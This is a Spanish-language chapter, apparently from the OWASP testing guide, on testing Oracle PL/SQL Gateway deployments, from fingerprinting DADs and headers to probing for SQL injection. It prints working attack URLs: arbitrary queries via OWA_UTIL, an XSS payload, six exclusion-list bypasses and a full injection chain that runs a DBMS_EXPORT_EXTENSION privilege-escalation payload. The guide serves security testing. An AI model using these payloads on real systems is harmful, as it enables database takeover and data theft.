Oracle

Resumen

Las aplicaciones PL/SQL basadas en web se habilitan mediante el PL/SQL Gateway, que traduce las peticiones web en consultas a la base de datos. Muchos despliegues lo exponen a través de Oracle REST Data Services (ORDS), a menudo delante de Oracle APEX. Los entornos más antiguos aún pueden usar Apache mod_plsql, Oracle HTTP Server, Oracle Application Server, Portal, los predecesores de HTML DB / APEX, WebDB o el servidor web de XML Database (XDB).

Este capítulo se centra en reconocer y probar endpoints del PL/SQL Gateway, incluidos los despliegues heredados de mod_plsql y Application Server que siguen en producción. Se debe aplicar la misma mentalidad de validación de entrada a las superficies de ORDS y APEX, y usar la guía general de Inyección SQL para las aplicaciones respaldadas por Oracle que no exponen el gateway.

Cómo probar

Cómo funciona el PL/SQL Gateway

En esencia, el PL/SQL Gateway actúa como un servidor proxy que toma la petición web del usuario y la pasa al servidor de base de datos, donde se ejecuta.

  1. El servidor web acepta una petición de un cliente web y determina si debe ser procesada por el PL/SQL Gateway.
  2. El PL/SQL Gateway procesa la petición extrayendo el nombre del paquete, el procedimiento y las variables solicitados.
  3. El paquete y el procedimiento solicitados se envuelven en un bloque de PL/SQL anónimo y se envían al servidor de base de datos.
  4. El servidor de base de datos ejecuta el procedimiento y devuelve los resultados al Gateway como HTML.
  5. El gateway envía la respuesta, a través del servidor web, de vuelta al cliente.

Entender este punto es importante: el código PL/SQL no existe en el servidor web sino en el servidor de base de datos. Esto significa que cualquier debilidad del PL/SQL Gateway o de la aplicación PL/SQL, cuando se explota, da a un atacante acceso directo al servidor de base de datos; ninguna cantidad de firewalls lo impedirá.

Las URL de las aplicaciones web PL/SQL normalmente son fáciles de reconocer y por lo general comienzan con lo siguiente (xyz puede ser cualquier cadena y representa un Database Access Descriptor, sobre el cual se verá más adelante):

  • https://www.example.com/pls/xyz
  • https://www.example.com/xyz/owa
  • https://www.example.com/xyz/plsql

El segundo y el tercero de estos ejemplos representan URL de despliegues más antiguos del PL/SQL Gateway; el primero es típico de Apache mod_plsql (/pls es el Location por defecto en plsql.conf, aunque la ruta puede cambiarse). Las asignaciones de ORDS difieren según la configuración y es posible que no usen /pls. La ausencia de una extensión de archivo en una URL podría indicar la presencia del Oracle PL/SQL Gateway. Considérese la siguiente URL:

https://www.server.com/aaa/bbb/xxxxx.yyyyy

Si xxxxx.yyyyy se reemplazara por algo como ebank.home, store.welcome, auth.login o books.search, entonces hay una probabilidad bastante alta de que se esté usando el PL/SQL Gateway. También es posible anteponer al paquete y procedimiento solicitados el nombre del usuario que los posee, es decir, el esquema; en este caso el usuario es webuser:

https://www.server.com/pls/xyz/webuser.pkg.proc

En esta URL, xyz es el Database Access Descriptor, o DAD. Un DAD especifica información sobre el servidor de base de datos para que el PL/SQL Gateway pueda conectarse. Contiene información como la cadena de conexión TNS, el ID de usuario y la contraseña, y los métodos de autenticación. En Apache mod_plsql, estos DAD se especifican en dads.conf; los listeners más antiguos usaban wdbsvr.app. ORDS usa sus propios archivos de pool/configuración en lugar de DAD. Algunos nombres de DAD por defecto históricos son los siguientes:

SIMPLEDAD
HTMLDB
ORASSO
SSODAD
PORTAL
PORTAL2
PORTAL30
PORTAL30_SSO

Determinar si el PL/SQL Gateway está en ejecución

Al realizar una evaluación contra un servidor, es importante saber primero con qué tecnología se está tratando realmente. Si todavía no se sabe, por ejemplo en un escenario de evaluación de caja negra, lo primero que hay que hacer es averiguarlo. Reconocer una aplicación PL/SQL basada en web es bastante fácil. Primero, está el formato de la URL y su aspecto, comentado arriba. Más allá de eso, hay un conjunto de pruebas sencillas que pueden realizarse para comprobar la existencia del PL/SQL Gateway.

Cabeceras de respuesta del servidor

Las cabeceras de respuesta pueden ayudar a identificar las capas web de Oracle, pero no son obligatorias ni fiables por sí solas. Muchos despliegues de ORDS y APEX están detrás de proxies inversos o redes de distribución de contenido (CDN) y devuelven un valor Server genérico, o ninguno. Se debe dar preferencia a la forma de la URL y a las pruebas siguientes cuando los banners estén ausentes o reescritos.

Señales útiles cuando están presentes:

  • Oracle-REST-Data-Services/... (ORDS).
  • Oracle-HTTP-Server, mod_plsql u Oracle-Application-Server (Oracle HTTP Server o Application Server heredados).
  • Cabeceras relacionadas como X-ORDS-* o las más antiguas X-APEX-*.

Ejemplos:

Server: Oracle-REST-Data-Services/24.2.0.r1234567
Server: Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server
Server: Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0

La prueba NULL

En PL/SQL, null es una expresión perfectamente aceptable:

SQL> BEGIN
  NULL;
  END;
  /
PL/SQL procedure successfully completed.

Podemos usar esto para comprobar si el servidor ejecuta el PL/SQL Gateway. Basta con tomar el DAD y añadir NULL, y luego añadir NOSUCHPROC:

  • https://www.example.com/pls/dad/null
  • https://www.example.com/pls/dad/nosuchproc

Si el servidor responde con un 200 OK a la primera y un 404 Not Found a la segunda, esto indica que el servidor ejecuta el PL/SQL Gateway.

Acceso a paquetes conocidos

En versiones antiguas del PL/SQL Gateway es posible acceder directamente a los paquetes que forman el PL/SQL Web Toolkit, como los paquetes OWA y HTP. Uno de estos paquetes es el paquete OWA_UTIL, del que hablaremos más adelante. Este paquete contiene un procedimiento llamado SIGNATURE que simplemente muestra en HTML una firma PL/SQL. Así, solicitar

https://www.example.com/pls/dad/owa_util.signature

devuelve la siguiente salida en la página web

"This page was produced by the PL/SQL Web Toolkit on date"

o

"This page was produced by the PL/SQL Cartridge on date"

Si no se obtiene esta respuesta sino una respuesta 403 Forbidden, se puede inferir que el PL/SQL Gateway está en ejecución. Esta es la respuesta que se debería obtener en versiones posteriores o en sistemas parcheados.

Acceso a paquetes PL/SQL arbitrarios de la base de datos

Es posible explotar vulnerabilidades en los paquetes PL/SQL que se instalan por defecto en el servidor de base de datos. Cómo hacerlo depende de la versión del PL/SQL Gateway. En versiones anteriores del PL/SQL Gateway, nada impedía a un atacante acceder a un paquete PL/SQL arbitrario del servidor de base de datos. Antes mencionamos el paquete OWA_UTIL. Este puede usarse para ejecutar consultas SQL arbitrarias:

https://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS

Los ataques de Cross Site Scripting podrían lanzarse a través del paquete HTP:

https://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>

Claramente, esto es peligroso, por lo que Oracle introdujo una lista de exclusión de PLSQL (PLSQL Exclusion list) para impedir el acceso directo a procedimientos tan peligrosos. Los elementos prohibidos incluyen cualquier petición que comience con SYS.*, cualquier petición que comience con DBMS_*, cualquier petición con HTP.* u OWA*. Sin embargo, es posible eludir la lista de exclusión. Es más, la lista de exclusión no impide el acceso a paquetes de los esquemas CTXSYS y MDSYS u otros, por lo que es posible explotar fallos en estos paquetes:

https://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL

Esto devolverá una página HTML en blanco con una respuesta 200 OK si el servidor de base de datos sigue siendo vulnerable a este fallo (CVE-2006-0265)

Fallos del PL/SQL Gateway

A lo largo de los años, el Oracle PL/SQL Gateway ha sufrido varios fallos, entre ellos el acceso a páginas de administración (CVE-2002-0561), desbordamientos de búfer (CVE-2002-0559), errores de directory traversal y vulnerabilidades que permiten a los atacantes eludir la Exclusion List y pasar a acceder y ejecutar paquetes PL/SQL arbitrarios en el servidor de base de datos.

Evasión de la lista de exclusión de PL/SQL

Es increíble cuántas veces Oracle ha intentado corregir fallos que permiten a los atacantes eludir la lista de exclusión. Cada parche que Oracle ha producido ha caído víctima de una nueva técnica de evasión. La historia de esta lamentable saga

Evasión de la lista de exclusión - Método 1

Cuando Oracle introdujo por primera vez la PL/SQL Exclusion List para impedir que los atacantes accedieran a paquetes PL/SQL arbitrarios, podía eludirse trivialmente anteponiendo al nombre del esquema/paquete un carácter de nueva línea, un espacio o un tabulador codificados en hexadecimal:

https://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC
https://www.example.com/pls/dad/%20SYS.PACKAGE.PROC
https://www.example.com/pls/dad/%09SYS.PACKAGE.PROC

Evasión de la lista de exclusión - Método 2

Versiones posteriores del Gateway permitían a los atacantes eludir la lista de exclusión anteponiendo al nombre del esquema/paquete una etiqueta. En PL/SQL, una etiqueta apunta a una línea de código a la que se puede saltar mediante la sentencia GOTO y tiene la siguiente forma: <<NAME>>

  • https://www.example.com/pls/dad/<<LBL>>SYS.PACKAGE.PROC

Evasión de la lista de exclusión - Método 3

Simplemente colocar el nombre del esquema/paquete entre comillas dobles podría permitir a un atacante eludir la lista de exclusión. Algunas versiones de Oracle Application Server (notablemente 10g) convierten la petición del usuario a minúsculas antes de enviarla al servidor de base de datos; como un identificador entre comillas distingue entre mayúsculas y minúsculas, SYS y sys no son lo mismo y las peticiones del segundo darán como resultado un 404 Not Found. En versiones anteriores, lo siguiente puede eludir la lista de exclusión:

https://www.example.com/pls/dad/"SYS".PACKAGE.PROC

Evasión de la lista de exclusión - Método 4

Dependiendo del juego de caracteres en uso en el servidor web y en el servidor de base de datos, algunos caracteres se traducen. Así, según los juegos de caracteres en uso, el carácter ÿ (0xFF) podría convertirse en una Y en el servidor de base de datos. Otro carácter que a menudo se convierte en una Y mayúscula es el carácter Macron, 0xAF. Esto puede permitir a un atacante eludir la lista de exclusión:

https://www.example.com/pls/dad/S%FFS.PACKAGE.PROC https://www.example.com/pls/dad/S%AFS.PACKAGE.PROC

Evasión de la lista de exclusión - Método 5

Algunas versiones del PL/SQL Gateway permiten eludir la lista de exclusión con una barra invertida, 0x5C:

https://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC

Evasión de la lista de exclusión - Método 6

Este es el método más complejo para eludir la lista de exclusión y es el parcheado más recientemente. Si solicitáramos lo siguiente

https://www.example.com/pls/dad/foo.bar?xyz=123

el servidor de aplicaciones ejecutaría lo siguiente en el servidor de base de datos:

declare
 rc__ number;
 start_time__ binary_integer;
 simple_list__ owa_util.vc_arr;
 complex_list__ owa_util.vc_arr;
begin
 start_time__ := dbms_utility.get_time;
 owa.init_cgi_env(:n__,:nm__,:v__);
 htp.HTBUF_LEN := 255;
 null;
 null;
 simple_list__(1) := 'sys.%';
 simple_list__(2) := 'dbms\_%';
 simple_list__(3) := 'utl\_%';
 simple_list__(4) := 'owa\_%';
 simple_list__(5) := 'owa.%';
 simple_list__(6) := 'htp.%';
 simple_list__(7) := 'htf.%';
 if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then
  rc__ := 2;
 else
  null;
  orasso.wpg_session.init();
  foo.bar(XYZ=>:XYZ);
  if (wpg_docload.is_file_download) then
   rc__ := 1;
   wpg_docload.get_download_file(:doc_info);
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
  else
   rc__ := 0;
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
   owa.get_page(:data__,:ndata__);
  end if;
 end if;
 :rc__ := rc__;
 :db_proc_time__ := dbms_utility.get_time-start_time__;
end;

Obsérvense las líneas 19 y 24. En la línea 19, la petición del usuario se comprueba contra una lista de cadenas "malas" conocidas, es decir, la lista de exclusión. Si el paquete y el procedimiento solicitados no contienen cadenas malas, el procedimiento se ejecuta en la línea 24. El parámetro XYZ se pasa como variable de enlace (bind variable).

Si luego solicitamos lo siguiente:

https://server.example.com/pls/dad/INJECT'POINT

se ejecuta el siguiente PL/SQL:

..
simple_list__(7) := 'htf.%';
if ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 inject'point;
..

Esto genera un error en el log de errores: "PLS-00103: Encountered the symbol ‘POINT’ when expecting one of the following. . ." Lo que tenemos aquí es una forma de inyectar SQL arbitrario. Esto puede explotarse para eludir la lista de exclusión. Primero, el atacante necesita encontrar un procedimiento PL/SQL que no reciba parámetros y que no coincida con nada de la lista de exclusión. Hay un buen número de paquetes por defecto que cumplen este criterio, por ejemplo:

JAVA_AUTONOMOUS_TRANSACTION.PUSH
XMLGEN.USELOWERCASETAGNAMES
PORTAL.WWV_HTP.CENTERCLOSE
ORASSO.HOME
WWC_VERSION.GET_HTTP_DATABASE_INFO

Un atacante debería elegir una de estas funciones que realmente esté disponible en el sistema objetivo (es decir, que devuelva un 200 OK al solicitarla). Como prueba, un atacante puede solicitar

https://server.example.com/pls/dad/orasso.home?FOO=BAR

el servidor debería devolver una respuesta 404 File Not Found porque el procedimiento orasso.home no requiere parámetros y se ha suministrado uno. Sin embargo, antes de que se devuelva el 404, se ejecuta el siguiente PL/SQL:

..
..
if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 orasso.home(FOO=>:FOO);
..
..

Obsérvese la presencia de FOO en la query string del atacante. Los atacantes pueden abusar de esto para ejecutar SQL arbitrario. Primero, necesitan cerrar los paréntesis:

https://server.example.com/pls/dad/orasso.home?);--=BAR

Esto da como resultado la ejecución del siguiente PL/SQL:

..
orasso.home();--=>:);--);
..

Todo lo que sigue al doble guion (--) se trata como un comentario. Esta petición provocará un error interno del servidor porque una de las variables de enlace ya no se usa, por lo que el atacante necesita volver a añadirla. Resulta que es esta variable de enlace la clave para ejecutar PL/SQL arbitrario. Por el momento, pueden usar simplemente HTP.PRINT para imprimir BAR, y añadir la variable de enlace necesaria como :1:

https://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR

Esto debería devolver un 200 con la palabra "BAR" en el HTML. Lo que sucede aquí es que todo lo que está después del signo igual, BAR en este caso, son los datos insertados en la variable de enlace. Usando la misma técnica también es posible volver a obtener acceso a owa_util.cellsprint:

https://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS

Para ejecutar SQL arbitrario, incluidas sentencias DML y DDL, el atacante inserta un execute immediate :1:

https://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual

Nota: la salida no se mostrará. Esto puede aprovecharse para explotar cualquier error de inyección PL/SQL propiedad de SYS, lo que permite a un atacante obtener el control completo del servidor de base de datos de backend. Por ejemplo, la siguiente URL aprovecha los fallos de inyección SQL en DBMS_EXPORT_EXTENSION

https://www.example.com/pls/dad/orasso.home?);
execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20
BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20
PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';
END;--','SYS',1,'VER',0);END;

Evaluación de aplicaciones web PL/SQL personalizadas

Durante las evaluaciones de seguridad de caja negra, el código de la aplicación PL/SQL personalizada no está disponible, pero aun así es necesario evaluarla en busca de vulnerabilidades de seguridad.

Inyección SQL

Cada parámetro de entrada debe probarse en busca de fallos de inyección SQL. Estos son fáciles de encontrar y confirmar. Encontrarlos es tan sencillo como incrustar una comilla simple en el parámetro y comprobar si hay respuestas de error (entre las que se incluyen los errores 404 Not Found). La confirmación de la presencia de inyección SQL puede realizarse usando el operador de concatenación.

Por ejemplo, supóngase que hay una aplicación web PL/SQL de una librería que permite a los usuarios buscar libros de un autor determinado:

https://www.example.com/pls/bookstore/books.search?author=DICKENS

Si esta petición devuelve libros de Charles Dickens, pero

https://www.example.com/pls/bookstore/books.search?author=DICK'ENS

devuelve un error o un 404, entonces podría existir un fallo de inyección SQL. Esto puede confirmarse usando el operador de concatenación:

https://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS

Si esta petición devuelve libros de Charles Dickens, se ha confirmado la presencia de la vulnerabilidad de inyección SQL.
